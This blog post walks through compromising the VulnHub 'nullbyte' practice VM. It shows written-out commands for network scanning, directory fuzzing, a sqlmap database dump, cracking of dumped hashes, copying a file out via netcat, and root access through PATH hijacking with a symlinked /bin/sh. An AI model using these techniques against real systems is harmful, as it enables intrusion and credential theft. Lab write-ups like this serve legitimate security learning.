---
layout: post
title:  "vulnhub nullbyte vm"
date:   2016-03-01 00:00:10 +0000
categories: vulnhub
---
<p>This is about nullbyte, a breakable vm from <a href="http://www.vulnhub.com">vulnhub</a>. Vulnhub is the ultime playground if you like coding/security :)
<br>
<p> I'm using debian with the packages i need to play with these VM's, yes i could use kali or any other vm but those are overwhelming for me.
<p> So let's get stated. Finding the machine:
{% highlight bash %}
sudo netdiscover -r 192.168.0.0/16
{% endhighlight %}
<p>The one with name CADMUS COMPUTER SYSTEMS is the nullbyte machine. Next, let's check what it's running:
{% highlight bash %}
nmap -p- -sV 192.168.1.84
{% endhighlight %}
<p>Running apache on port 80, running ssh on port 777. There are other two services that i ignored.
<p>So, i open browser and found a pretty much unuseful page e h... i tried to search for other directories/pages on the server so i used wfuzz.py and also made lame attempt to replace wfuzz.py. Just because. This lame attempt is visible in <a href="https://github.com/impious/trash">github</a> as hfuzz.rb.
{% highlight bash %}
python wfuzz.py -c -z file,wordlist/general/common.txt --hc 404 -o html  http://192.168.1.84/FUZZ
{% endhighlight %}
<p> A few directories but the most import was <b>phpmyadmin</b>. There must be something more than a simple html with an image. Neverless i couldn't find anything useful, so i took a glimpse at the <a href="http://anthonyferrillo.net/blog/nullbyte-solution/">walkthrough</a> and saw that people checked the image.
<p>By now i already knew that there was an url on the image, shamefully i know, but 'live and learn'. Went through an opened it in the browser and saw that the newly found page had a form and message saying the password wasn't hard. Again, i build an brute forcer to found the password. You can check the code <a href="https://github.com/impious/trash">github</a> as brute.rb. After a few minutes i found the password 'elite'. Btw, for real brute forcing use hydra.
<p>Anyway, a new form was found with a texbox on it. After playing around in the browser i found http://192.168.1.84/kzMb5nVYJw/420search.php which had a few data on it . That search smelled as sqli so i fired up sqlmap.py. Yes dump-all. No big databases on this playing vm's.
{% highlight bash %}
sqlmap -u http://192.168.1.84/kzMb5nVYJw/420search.php?usrtosearch=ramses --dump-all
{% endhighlight %}
<p> Got the password YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE from the output tables. So i searched it on google which pointed me to base64 and md5. Although it didn't have a "=" which usually means it's encode in base64  <a href="https://www.base64decode.org/">https://www.base64decode.org/</a> to decode then to <a href="https://hashkiller.co.uk/md5-decrypter.aspx">https://hashkiller.co.uk/md5-decrypter.aspx</a>. <br>Password: omega.
<p>Ok, now i had an user.
{% highlight bash %}
ssh ramses@192.168.1.84 -p 777
{% endhighlight %}
<p> First thing i always check is .bash_history.
{% highlight bash %}
cat .bash_history
{% endhighlight %}
<p> a file in backup and the website itself.
{% highlight bash %}
cd /var/www
{% endhighlight %}
<p>Went through the directory tree and reached the 420search.php.
{% highlight bash %}
cat 420search.php
{% endhighlight %}
<p> Eheheh, by now i could login in phpmyadmin with root:sunnyvale. I also tried this login in command line with no luck.
<p>In the .bash_history they pointed out the file 'procwatch', which owned/runned as root. I couldn't find anything more about it and it seemed to run a simple 'ps'. After a while, i copied it to my computer with netcat:
{% highlight bash %}
nc -lnvvp 4444 > procwatch
{% endhighlight %}
{% highlight bash %}
nc 192.168.1.73 4444 < procwatch
{% endhighlight %}
<p>I remembered a trick i read in other vm's walkthroughs, so i symlinked /bin/sh into ps and changed the  path to prioritize my symlinked:
{% highlight bash %}
ln -s /bin/sh ps
export PATH=.:$PATH
{% endhighlight %}
<p>
and then run the process and voilá, root. This was pure luck because i could only do that if the parameter passed which i assumed was 'ps' didn't have the full path.
<br><p> Saw other people resolution and i must learn how to gdb properly. Others created a newly ps and changed the path to prioritize. Anyway, my deadlock in this was one the damn image, Neverless it was pure fun. :)
